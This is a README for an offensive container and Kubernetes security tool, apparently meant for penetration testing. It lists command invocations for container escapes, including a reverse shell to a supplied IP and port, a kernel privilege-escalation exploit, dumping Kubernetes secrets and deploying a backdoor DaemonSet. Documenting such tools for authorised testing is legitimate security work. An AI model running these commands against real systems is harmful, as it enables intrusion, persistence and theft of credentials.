# Ckyn - Lightweight Container Security Assessment Tool

A focused container security assessment tool for penetration testing and security research.

## Features

- **Container Security Evaluation** - Assess container security posture
- **Container Escape** - Exploit container escape vulnerabilities
- **K8s Exploitation** - Kubernetes cluster exploitation
- **Credential Scanning** - Find leaked secrets and credentials
- **Privilege Escalation** - CVE-2026-31431 copy-fail exploit
- **Embedded Busybox** - 400+ Unix utilities in a single binary

## Quick Start

```bash
# Evaluate container security
./ckyn evaluate [--full]

# List available exploits
./ckyn run --list

# Run specific exploit
./ckyn run <exploit-name> [<args>...]

# Use embedded busybox
./ckyn busybox ls -la
./ckyn busybox ps aux
./ckyn busybox --list
```

## Embedded Binaries

| Binary | Architecture | Source | Description |
|--------|--------------|--------|-------------|
| busybox | x86_64, static | [busybox-static-binaries-fat](https://github.com/shutingrz/busybox-static-binaries-fat) | 400+ Unix utilities |
| exploit-passwd | x86_64, static | [copy-fail-c](https://github.com/tgies/copy-fail-c/releases) | CVE-2026-31431 LPE |

## Available Tools

| Tool | Command | Description |
|------|---------|-------------|
| busybox | `ckyn busybox [<args>...]` | Embedded busybox with 400+ Unix utilities |
| kcurl | `ckyn kcurl <token> get\|post <url>` | Request K8s API Server |
| ectl | `ckyn ectl <endpoint> get <key>` | Enumerate etcd keys |
| ucurl | `ckyn ucurl get\|post <socket> <url>` | Request Docker Unix Socket |
| probe | `ckyn probe <ip> <port> <parallel> <timeout>` | TCP port scan |

## Container Escape Exploits

```bash
# Check Docker Socket
./ckyn run docker-sock-check /var/run/docker.sock

# Escape via cgroup
./ckyn run mount-cgroup "shell-cmd"

# Escape via runc vulnerability (CVE-2019-5736)
./ckyn run runc-pwn "shell-cmd"

# Escape via containerd shim (CVE-2020-15257)
./ckyn run shim-pwn reverse <ip> <port>
```

## Privilege Escalation

```bash
# CVE-2026-31431 copy-fail exploit
# Overwrites SUID binary page cache via AF_ALG + splice
# Affects kernels 4.14 - 6.x
./ckyn run copy-fail-cve-2026-31431 [/usr/bin/su]
```

## K8s Exploitation

```bash
# Dump K8s secrets
./ckyn run k8s-secret-dump <token>

# Deploy backdoor DaemonSet
./ckyn run k8s-backdoor-daemonset <token> <image>
```

## Credential Scanning

```bash
# Scan for leaked AK/Secrets
./ckyn run ak-leakage /path/to/scan

# Supported patterns:
# - AWS API Key (AKIA...)
# - SSH/RSA/PGP private keys
# - GitHub/Google/Facebook OAuth tokens
# - Slack tokens and webhooks
# - Generic secrets and API keys
```

## Build

```bash
# Linux amd64 (includes embedded binaries)
CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -ldflags="-w -s" ./cmd/ckyn/

# With compression
upx --best ckyn
```

## Binary Size

| Component | Size |
|-----------|------|
| Go code + exploits | ~13MB |
| Embedded busybox | ~1.1MB |
| Embedded exploit-passwd | ~1.0MB |
| **Total** | **~16MB** |

## Why Ckyn?

- **Focused** - Only container/K8s security features
- **Self-contained** - Includes busybox and exploit binaries
- **Complementary** - Works alongside linpeas, other tools
- **Fast** - Quick evaluation and exploitation

## Legal Disclaimer

This tool is for security testing purposes only. Usage against targets without prior consent is illegal.
